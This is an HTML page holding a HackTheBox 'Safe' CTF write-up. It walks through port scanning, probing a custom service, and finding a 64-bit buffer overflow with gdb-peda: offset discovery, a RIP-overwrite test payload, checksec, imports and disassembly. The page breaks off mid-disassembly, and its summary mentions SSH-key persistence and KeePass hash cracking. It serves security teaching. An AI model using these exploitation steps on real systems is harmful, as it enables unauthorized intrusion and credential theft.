@@ -1,0 +1,881 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Safe</strong></h1>
+        <em>Released: July 2019 / Pwned: August 21st 2019 - [+] Solved whilst Active</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        Safe starts with a l33t port, downloading a file from a web server and then finding a buffer overflow vulnerability on the l33t port. After exploiting the binary with ROP, you can establish persistence on the machine by adding your ssh public key to the exploited user's <code>authorized_keys</code> file. Lastly, a set of hashes generated from images in <code>user</code>'s home folder get passed into <code>john</code> to be cracked and open up a keepass database.<br>
+        <br>
+        Note that the binary exploitation part of this box is probably too long and over-explained.<br>
+        I found it difficult to be clear, difficult and succinct without writing too much.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h4><strong>Summary</strong></h4>
+        • Visit the website and view the source to find an exploitable binary<br>
+        • Disassemble the binary to find a <code>test</code> function that can be used to write a pointer to <code>/bin/sh</code> into RDI and gain a shell<br>
+        • Write a python script to exploit the binary and gain a user shell<br>
+        • Establish persistence on the machine by copying your ssh public key into the user's <code>authorized_keys</code> file<br>
+        • Use <code>keepass2john</code> and the images in <code>user</code>'s home to generate hashes for the keepass database<br>
+        • Crack the generated hashes using john and get 1 result<br>
+        • Open <code>MyPasswords.kdbx</code> using the cracked password and corresponding image as the key and retrieve <code>root</code>'s pasword<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        My usual nmap scan - <code>nmap -sC -sV -O -oN</code> - ran slow on this machine. I'm not sure why :/<br>
+        I ran a simple all-ports scan instead - <code>nmap -p- 10.10.10.147</code><br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@city64:~/ctf/safe#&nbsp;nmap&nbsp;-p-&nbsp;10.10.10.147<br>
+                ...<br>
+                Nmap&nbsp;scan&nbsp;report&nbsp;for&nbsp;10.10.10.147<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.060s&nbsp;latency).<br>
+                Not&nbsp;shown:&nbsp;65532&nbsp;closed&nbsp;ports<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE<br>
+                22/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;ssh<br>
+                80/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;http<br>
+                1337/tcp&nbsp;open&nbsp;&nbsp;waste<br>
+                <br>
+                Nmap&nbsp;done:&nbsp;1&nbsp;IP&nbsp;address&nbsp;(1&nbsp;host&nbsp;up)&nbsp;scanned&nbsp;in&nbsp;43.13&nbsp;seconds
+            </div>
+        </div><br>
+        <br>
+        <strong>Ports</strong><br>
+        • 22/ssh - Not of any use for the moment, but good to note for later<br>
+        • 80/http - A website. Always useful to check<br>
+        • 1337/waste - Something custom!<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 1337/waste</strong></h2><br>
+        I decided to look at <code>1337/waste</code> first because it was unique.<br>
+        I connected to the port via <code>nc</code> to investigate.<br>
+            <div class="codebox">
+                root@city64:~/ctf/safe#&nbsp;nc&nbsp;10.10.10.147&nbsp;1337<br>
+                &nbsp;08:06:41&nbsp;up&nbsp;&nbsp;3:07,&nbsp;&nbsp;1&nbsp;user,&nbsp;&nbsp;load&nbsp;average:&nbsp;0.00,&nbsp;0.00,&nbsp;0.00<br>
+                hey<br>
+                <br>
+                What&nbsp;do&nbsp;you&nbsp;want&nbsp;me&nbsp;to&nbsp;echo&nbsp;back?&nbsp;hey<br>
+                root@city64:~/ctf/safe#&nbsp;nc&nbsp;10.10.10.147&nbsp;1337<br>
+                &nbsp;08:06:47&nbsp;up&nbsp;&nbsp;3:07,&nbsp;&nbsp;1&nbsp;user,&nbsp;&nbsp;load&nbsp;average:&nbsp;0.00,&nbsp;0.00,&nbsp;0.00<br>
+                ls<br>
+                <br>
+                What&nbsp;do&nbsp;you&nbsp;want&nbsp;me&nbsp;to&nbsp;echo&nbsp;back?&nbsp;ls
+            </div>
+        </div><br>
+        <br>
+        It looks like there's service running which prints the system's uptime and echoes back whatever we give it.<br>
+        <br>
+        If you send enough data, like 200 <code>A</code>s, the service won't echo back what you give it.<br>
+            <div class="codebox">
+                root@city64:~/ctf/safe#&nbsp;python&nbsp;-c&nbsp;'print&nbsp;"A"*20'&nbsp;|&nbsp;nc&nbsp;10.10.10.147&nbsp;1337<br>
+                &nbsp;08:08:49&nbsp;up&nbsp;&nbsp;3:09,&nbsp;&nbsp;1&nbsp;user,&nbsp;&nbsp;load&nbsp;average:&nbsp;0.00,&nbsp;0.00,&nbsp;0.00<br>
+                <br>
+                What&nbsp;do&nbsp;you&nbsp;want&nbsp;me&nbsp;to&nbsp;echo&nbsp;back?&nbsp;AAAAAAAAAAAAAAAAAAAA<br>
+                root@city64:~/ctf/safe#&nbsp;python&nbsp;-c&nbsp;'print&nbsp;"A"*200'&nbsp;|&nbsp;nc&nbsp;10.10.10.147&nbsp;1337<br>
+                &nbsp;08:08:54&nbsp;up&nbsp;&nbsp;3:10,&nbsp;&nbsp;1&nbsp;user,&nbsp;&nbsp;load&nbsp;average:&nbsp;0.00,&nbsp;0.00,&nbsp;0.00
+            </div>
+        </div><br>
+        <br>
+        This functionality (or lack of) hints that the binary running on port 1337 might be vulnerable to a buffer overflow.<br>
+        Nothing else to do here, so I moved on to port 80.<br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) 80/http</strong></h2><br>
+        The website is a default Apache page.<br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        <code>Right Click &gt; View Source</code> will reveal a comment.<br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        You can download the binary running on port 1337 at <code>http://10.10.10.147/myapp</code>.<br>
+        How kind!<br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        <a id="h1-2" name="h1-2"></a><strong></strong>
+        <h1><strong>myapp Exploitation</strong></h1>
+        With the <code>myapp</code> binary downloaded, you can investigate it for vulns.<br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>Tools Used</strong></h3><br>
+        • <strong>gdb-peda</strong> - an improved version of gdb, used to debug the binary - <a href="https://github.com/longld/peda">https://github.com/longld/peda</a><br>
+        • <strong>pwntools</strong> - an exploit development library for python, used to connect to the remote service - <a href="http://docs.pwntools.com/en/stable/">http://docs.pwntools.com/en/stable/</a><br>
+        • <strong>ropper</strong> - used to find ROP gadgets - <a href="https://github.com/sashs/Ropper">https://github.com/sashs/Ropper</a><br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) myapp Overflow Testing</strong></h2><br>
+        First, you should verify whether <code>myapp</code> really is exploitable to a buffer overflow.<br>
+        <br>
+        <a id="h3-3" name="h3-3"></a><strong></strong>
+        <h3><strong>4a) Find offset to RIP</strong></h3><br>
+        Open the binary in <code>gdb-peda</code>, set the <code>follow-fork-mode</code> to <code>parent</code> (so that gdb won't follow any forked processes created by the binary) and create a pattern using <code>pattern create</code>.<br>
+            <div class="codebox">
+                root@city64:~/ctf/safe#&nbsp;gdb&nbsp;-q&nbsp;myapp<br>
+                Reading&nbsp;symbols&nbsp;from&nbsp;myapp...(no&nbsp;debugging&nbsp;symbols&nbsp;found)...done.<br>
+                gdb-peda$&nbsp;set&nbsp;follow-fork-mode&nbsp;parent<br>
+                gdb-peda$&nbsp;pattern&nbsp;create&nbsp;200<br>
+                'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
+            </div>
+        </div><br>
+        <br>
+        Run the binary and provide the cyclic (non-repeating) pattern you've created as input.<br>
+        The binary will crash.<br>
+            <div class="codebox">
+                gdb-peda$&nbsp;run<br>
+                Starting&nbsp;program:&nbsp;/root/ctf/safe/myapp&nbsp;<br>
+                [Detaching&nbsp;after&nbsp;fork&nbsp;from&nbsp;child&nbsp;process&nbsp;16290]<br>
+                &nbsp;13:47:14&nbsp;up&nbsp;4&nbsp;days,&nbsp;16:56,&nbsp;&nbsp;1&nbsp;user,&nbsp;&nbsp;load&nbsp;average:&nbsp;0.04,&nbsp;0.03,&nbsp;0.06<br>
+                <br>
+                What&nbsp;do&nbsp;you&nbsp;want&nbsp;me&nbsp;to&nbsp;echo&nbsp;back?&nbsp;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA<br>
+                AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA<br>
+                <br>
+                Program&nbsp;received&nbsp;signal&nbsp;SIGSEGV,&nbsp;Segmentation&nbsp;fault.<br>
+                [----------------------------------registers-----------------------------------]<br>
+                RAX:&nbsp;0x0&nbsp;<br>
+                RBX:&nbsp;0x0&nbsp;<br>
+                RCX:&nbsp;0x7ffff7ed9804&nbsp;(&lt;__GI___libc_write+20&gt;: cmp&nbsp;&nbsp;&nbsp;&nbsp;rax,0xfffffffffffff000)<br>
+                RDX:&nbsp;0x7ffff7fac8c0&nbsp;--&gt;&nbsp;0x0&nbsp;<br>
+                RSI:&nbsp;0x405260&nbsp;("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)<br>
+                RDI:&nbsp;0x0&nbsp;<br>
+                RBP:&nbsp;0x41414e4141384141&nbsp;('AA8AANAA')<br>
+                RSP:&nbsp;0x7fffffffe1a8&nbsp;("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")<br>
+                RIP:&nbsp;0x4011ac&nbsp;(&lt;main+77&gt;: ret)<br>
+                R8&nbsp;:&nbsp;0x7ffff7fb1500&nbsp;(0x00007ffff7fb1500)<br>
+                R9&nbsp;:&nbsp;0x0&nbsp;<br>
+                R10:&nbsp;0xfffffffffffff418&nbsp;<br>
+                R11:&nbsp;0x246&nbsp;<br>
+                R12:&nbsp;0x401070&nbsp;(&lt;_start&gt;: xor&nbsp;&nbsp;&nbsp;&nbsp;ebp,ebp)<br>
+                R13:&nbsp;0x7fffffffe280&nbsp;--&gt;&nbsp;0x1&nbsp;<br>
+                R14:&nbsp;0x0&nbsp;<br>
+                R15:&nbsp;0x0<br>
+                EFLAGS:&nbsp;0x10246&nbsp;(carry&nbsp;PARITY&nbsp;adjust&nbsp;ZERO&nbsp;sign&nbsp;trap&nbsp;INTERRUPT&nbsp;direction&nbsp;overflow)<br>
+                [-------------------------------------code-------------------------------------]<br>
+                &nbsp;&nbsp;&nbsp;0x4011a1&nbsp;&lt;main+66&gt;: call&nbsp;&nbsp;&nbsp;0x401030&nbsp;&lt;puts@plt&gt;<br>
+                &nbsp;&nbsp;&nbsp;0x4011a6&nbsp;&lt;main+71&gt;: mov&nbsp;&nbsp;&nbsp;&nbsp;eax,0x0<br>
+                &nbsp;&nbsp;&nbsp;0x4011ab&nbsp;&lt;main+76&gt;: leave&nbsp;&nbsp;<br>
+                =&gt;&nbsp;0x4011ac&nbsp;&lt;main+77&gt;: ret&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;&nbsp;0x4011ad: nop&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;PTR&nbsp;[rax]<br>
+                &nbsp;&nbsp;&nbsp;0x4011b0&nbsp;&lt;__libc_csu_init&gt;: push&nbsp;&nbsp;&nbsp;r15<br>
+                &nbsp;&nbsp;&nbsp;0x4011b2&nbsp;&lt;__libc_csu_init+2&gt;: mov&nbsp;&nbsp;&nbsp;&nbsp;r15,rdx<br>
+                &nbsp;&nbsp;&nbsp;0x4011b5&nbsp;&lt;__libc_csu_init+5&gt;: push&nbsp;&nbsp;&nbsp;r14<br>
+                [------------------------------------stack-------------------------------------]<br>
+                0000|&nbsp;0x7fffffffe1a8&nbsp;("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")<br>
+                0008|&nbsp;0x7fffffffe1b0&nbsp;("AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")<br>
+                0016|&nbsp;0x7fffffffe1b8&nbsp;("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")<br>
+                0024|&nbsp;0x7fffffffe1c0&nbsp;("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")<br>
+                0032|&nbsp;0x7fffffffe1c8&nbsp;("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")<br>
+                0040|&nbsp;0x7fffffffe1d0&nbsp;("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")<br>
+                0048|&nbsp;0x7fffffffe1d8&nbsp;("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")<br>
+                0056|&nbsp;0x7fffffffe1e0&nbsp;("AuAAXAAvAAYAAwAAZAAxAAyA")<br>
+                [------------------------------------------------------------------------------]<br>
+                Legend:&nbsp;code,&nbsp;data,&nbsp;rodata,&nbsp;value<br>
+                Stopped&nbsp;reason:&nbsp;SIGSEGV<br>
+                0x00000000004011ac&nbsp;in&nbsp;main&nbsp;()
+            </div>
+        </div><br>
+        <br>
+        If this was 32-bit machine, <code>EIP</code> would be overwritten with a string from your cyclic pattern.<br>
+        On 64-bit machines, <code>RIP</code> can only be overwritten if a valid 64-bit value is provided.<br>
+        Whilst 64-bit registers can hold 8 bytes of data, the maximum value on 64-bit machines is <code>0x00007FFFFFFFFFFF</code>.<br>
+        If you want to overwrite <code>RIP</code> on 64-bit machines, you have to provide a 6-byte value.<br>
+        <br>
+        Because the string from your cyclic value won't overwrite <code>RIP</code> (because it'll be 8 bytes long, not a valid 64-bit address), the return address will still be sat on the top of the stack (i think, correct me if I'm wrong someone).<br>
+        <br>
+        Therefore, you can find the offset to overwrite <code>RIP</code> by reading the value at the top of the stack.<br>
+        • <code>x/</code> - examine memory<br>
+        • <code>x</code> - display the value as hex<br>
+        • <code>g</code> - read value in a unit size of giant words (8 bytes)<br>
+        • <code>$rsp</code> - examine the value pointed to by RSP<br>
+        <br>
+            <div class="codebox">
+                gdb-peda$&nbsp;x/xg&nbsp;$rsp<br>
+                0x7fffffffe1a8: 0x414f41413941416a<br>
+                gdb-peda$&nbsp;pattern&nbsp;offset&nbsp;0x414f41413941416a<br>
+                4706051884014715242&nbsp;found&nbsp;at&nbsp;offset:&nbsp;120
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-4" name="h3-4"></a><strong></strong>
+        <h3><strong>4b) Test RIP Overwrite</strong></h3><br>
+        Now that you have offset to overwrite <code>RIP</code>, it's a good idea to test it and write a script to gain control of RIP.<br>
+        <br>
+        <strong>initial.py</strong><br>
+            <div class="codebox">
+                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*<span style="color:#ff0044;font-weight:400">120</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;offset&nbsp;to&nbsp;RIP&nbsp;at&nbsp;120&nbsp;bytes</span><br>
+                payload&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"B"</span>*<span style="color:#ff0044;font-weight:400">6</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;overwrite&nbsp;RIP</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;payload
+            </div>
+        </div><br>
+        <br>
+        Run the script and write the payload out to a text file.<br>
+            <div class="codebox">
+                root@city64:~/ctf/safe#&nbsp;python&nbsp;initial.py&nbsp;&gt;&nbsp;initial.txt
+            </div>
+        </div><br>
+        <br>
+        And run the payload against the binary in <code>gdb</code> to test your exploit.<br>
+        The program will crash and you'll see that <code>RIP</code> has been overwritten with <code>0x424242424242</code> - 6 <code>B</code>s.<br>
+            <div class="codebox">
+                gdb-peda$&nbsp;run&nbsp;&lt;&nbsp;initial.txt<br>
+                Starting&nbsp;program:&nbsp;/root/ctf/safe/myapp&nbsp;&lt;&nbsp;initial.txt<br>
+                [Detaching&nbsp;after&nbsp;fork&nbsp;from&nbsp;child&nbsp;process&nbsp;16347]<br>
+                &nbsp;14:03:21&nbsp;up&nbsp;4&nbsp;days,&nbsp;17:12,&nbsp;&nbsp;1&nbsp;user,&nbsp;&nbsp;load&nbsp;average:&nbsp;0.12,&nbsp;0.08,&nbsp;0.05<br>
+                <br>
+                What&nbsp;do&nbsp;you&nbsp;want&nbsp;me&nbsp;to&nbsp;echo&nbsp;back?&nbsp;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB<br>
+                <br>
+                Program&nbsp;received&nbsp;signal&nbsp;SIGSEGV,&nbsp;Segmentation&nbsp;fault.<br>
+                <br>
+                [----------------------------------registers-----------------------------------]<br>
+                RAX:&nbsp;0x0&nbsp;<br>
+                RBX:&nbsp;0x0&nbsp;<br>
+                RCX:&nbsp;0x7ffff7ed9804&nbsp;(&lt;__GI___libc_write+20&gt;: cmp&nbsp;&nbsp;&nbsp;&nbsp;rax,0xfffffffffffff000)<br>
+                RDX:&nbsp;0x7ffff7fac8c0&nbsp;--&gt;&nbsp;0x0&nbsp;<br>
+                RSI:&nbsp;0x405260&nbsp;("What&nbsp;do&nbsp;you&nbsp;want&nbsp;me&nbsp;to&nbsp;echo&nbsp;back?&nbsp;",&nbsp;'A'&nbsp;&lt;repeats&nbsp;120&nbsp;times&gt;,&nbsp;"BBBBBB\n")<br>
+                RDI:&nbsp;0x0&nbsp;<br>
+                RBP:&nbsp;0x4141414141414141&nbsp;('AAAAAAAA')<br>
+                RSP:&nbsp;0x7fffffffe1b0&nbsp;--&gt;&nbsp;0x0&nbsp;<br>
+                RIP:&nbsp;0x424242424242&nbsp;('BBBBBB')<br>
+                R8&nbsp;:&nbsp;0x7ffff7fb1500&nbsp;(0x00007ffff7fb1500)<br>
+                R9&nbsp;:&nbsp;0x0&nbsp;<br>
+                R10:&nbsp;0xfffffffffffff418&nbsp;<br>
+                R11:&nbsp;0x246&nbsp;<br>
+                R12:&nbsp;0x401070&nbsp;(&lt;_start&gt;: xor&nbsp;&nbsp;&nbsp;&nbsp;ebp,ebp)<br>
+                R13:&nbsp;0x7fffffffe280&nbsp;--&gt;&nbsp;0x1&nbsp;<br>
+                R14:&nbsp;0x0&nbsp;<br>
+                R15:&nbsp;0x0<br>
+                EFLAGS:&nbsp;0x10246&nbsp;(carry&nbsp;PARITY&nbsp;adjust&nbsp;ZERO&nbsp;sign&nbsp;trap&nbsp;INTERRUPT&nbsp;direction&nbsp;overflow)<br>
+                [-------------------------------------code-------------------------------------]<br>
+                Invalid&nbsp;$PC&nbsp;address:&nbsp;0x424242424242<br>
+                [------------------------------------stack-------------------------------------]<br>
+                0000|&nbsp;0x7fffffffe1b0&nbsp;--&gt;&nbsp;0x0&nbsp;<br>
+                0008|&nbsp;0x7fffffffe1b8&nbsp;--&gt;&nbsp;0x7fffffffe288&nbsp;--&gt;&nbsp;0x7fffffffe56b&nbsp;("/root/ctf/safe/myapp")<br>
+                0016|&nbsp;0x7fffffffe1c0&nbsp;--&gt;&nbsp;0x100040000&nbsp;<br>
+                0024|&nbsp;0x7fffffffe1c8&nbsp;--&gt;&nbsp;0x40115f&nbsp;(&lt;main&gt;: push&nbsp;&nbsp;&nbsp;rbp)<br>
+                0032|&nbsp;0x7fffffffe1d0&nbsp;--&gt;&nbsp;0x0&nbsp;<br>
+                0040|&nbsp;0x7fffffffe1d8&nbsp;--&gt;&nbsp;0xe6d37e21b5d32080&nbsp;<br>
+                0048|&nbsp;0x7fffffffe1e0&nbsp;--&gt;&nbsp;0x401070&nbsp;(&lt;_start&gt;: xor&nbsp;&nbsp;&nbsp;&nbsp;ebp,ebp)<br>
+                0056|&nbsp;0x7fffffffe1e8&nbsp;--&gt;&nbsp;0x7fffffffe280&nbsp;--&gt;&nbsp;0x1&nbsp;<br>
+                [------------------------------------------------------------------------------]<br>
+                Legend:&nbsp;code,&nbsp;data,&nbsp;rodata,&nbsp;value<br>
+                Stopped&nbsp;reason:&nbsp;SIGSEGV<br>
+                0x0000424242424242&nbsp;in&nbsp;??&nbsp;()
+            </div>
+        </div><br>
+        <br>
+        Success! <code>RIP</code> has been overwritten.<br>
+        You now know for sure that the binary has a buffer overflow vulnerability.<br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) myapp Reconnaissance</strong></h2><br>
+        Next, run some reconnaissance against the binary to gather some information on how to exploit it.<br>
+        <br>
+        <strong>Find out:</strong><br>
+        • does the binary have any protections?<br>
+        • what functions does the binary import?<br>
+        • how does the binary read in assembly?<br>
+        <br>
+        With the answers to these questions, you can figure out how to exploit the binary.<br>
+        <br>
+        <a id="h3-5" name="h3-5"></a><strong></strong>
+        <h3><strong>5a) Binary Protections</strong></h3><br>
+        Open the binary in <code>gdb-peda</code> and run <code>checksec</code>.<br>
+            <div class="codebox">
+                root@city64:~/ctf/safe#&nbsp;gdb&nbsp;-q&nbsp;myapp<br>
+                Reading&nbsp;symbols&nbsp;from&nbsp;myapp...(no&nbsp;debugging&nbsp;symbols&nbsp;found)...done.<br>
+                gdb-peda$&nbsp;checksec<br>
+                CANARY&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;disabled<br>
+                FORTIFY&nbsp;&nbsp;&nbsp;:&nbsp;disabled<br>
+                NX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;ENABLED<br>
+                PIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;disabled<br>
+                RELRO&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Partial
+            </div>
+        </div><br>
+        <br>
+        There's 1 protection - <code>NX</code>.<br>
+        <code>NX</code> stands for Non-Executable.<br>
+        This protection renders the stack as non-executable, meaning that we can't drop shell-spawning shellcode onto the stack and execute it.<br>
+        <br>
+        <a id="h3-6" name="h3-6"></a><strong></strong>
+        <h3><strong>5b) Imported Functions</strong></h3><br>
+        <code>rabin2</code> will show you any functions that the binary imports.<br>
+            <div class="codebox">
+                root@city64:~/ctf/safe#&nbsp;rabin2&nbsp;-i&nbsp;myapp<br>
+                [Imports]<br>
+                Num&nbsp;&nbsp;Vaddr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Bind&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Type&nbsp;Name<br>
+                &nbsp;&nbsp;&nbsp;1&nbsp;0x00401030&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;puts<br>
+                &nbsp;&nbsp;&nbsp;2&nbsp;0x00401040&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;system<br>
+                &nbsp;&nbsp;&nbsp;3&nbsp;0x00401050&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;printf<br>
+                &nbsp;&nbsp;&nbsp;4&nbsp;0x00000000&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;__libc_start_main<br>
+                &nbsp;&nbsp;&nbsp;5&nbsp;0x00000000&nbsp;&nbsp;&nbsp;&nbsp;WEAK&nbsp;&nbsp;NOTYPE&nbsp;__gmon_start__<br>
+                &nbsp;&nbsp;&nbsp;6&nbsp;0x00401060&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;gets<br>
+                &nbsp;&nbsp;&nbsp;4&nbsp;0x00000000&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;__libc_start_main<br>
+                &nbsp;&nbsp;&nbsp;5&nbsp;0x00000000&nbsp;&nbsp;&nbsp;&nbsp;WEAK&nbsp;&nbsp;NOTYPE&nbsp;__gmon_start__
+            </div>
+        </div><br>
+        <br>
+        One go-to technique to bypass <code>NX</code> protection is ret2libc.<br>
+        ret2libc overwrites RIP to return to a function in C's <code>libc</code> library, usually <code>system()</code>, and run a system command like <code>system("/bin/sh")</code> to spawn a shell.<br>
+        <br>
+        With <code>system()</code> already imported into binary from <code>libc</code>, you don't have to go through the bother of a ret2libc attack.<br>
+        Instead, you can simply use <code>system()</code> by referring to its virtual address - <code>0x00401040 GLOBAL FUNC system</code><br>
+        <br>
+        This will make exploitation/spawning a shell using <code>system()</code> easier.<br>
+        <br>
+        <a id="h3-7" name="h3-7"></a><strong></strong>
+        <h3><strong>5c) Disassemble Binary</strong></h3><br>
+        Lastly, read the assembly code of the binary using <code>objdump</code>.<br>
+            <div class="codebox">
+                root@city64:~/ctf/safe#&nbsp;objdump&nbsp;-M&nbsp;intel&nbsp;-d&nbsp;myapp<br>
+                <br>
+                myapp:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file&nbsp;format&nbsp;elf64-x86-64<br>
+                ...<br>
+                <br>
+                0000000000401152&nbsp;&lt;test&gt;:<br>
+                &nbsp;&nbsp;401152: 55&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp;rbp<br>
+                &nbsp;&nbsp;401153: 48&nbsp;89&nbsp;e5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;rbp,rsp<br>
+                &nbsp;&nbsp;401156: 48&nbsp;89&nbsp;e7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;rdi,rsp<br>
+                &nbsp;&nbsp;401159: 41&nbsp;ff&nbsp;e5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp;&nbsp;r13<br>
+                &nbsp;&nbsp;40115c: 90&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nop<br>
+                &nbsp;&nbsp;40115d: 5d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp;&nbsp;rbp<br>
+                &nbsp;&nbsp;40115e: c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ret&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                <br>
+                000000000040115f&nbsp;&lt;main&gt;:<br>
+                &nbsp;&nbsp;40115f: 55&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp;rbp<br>
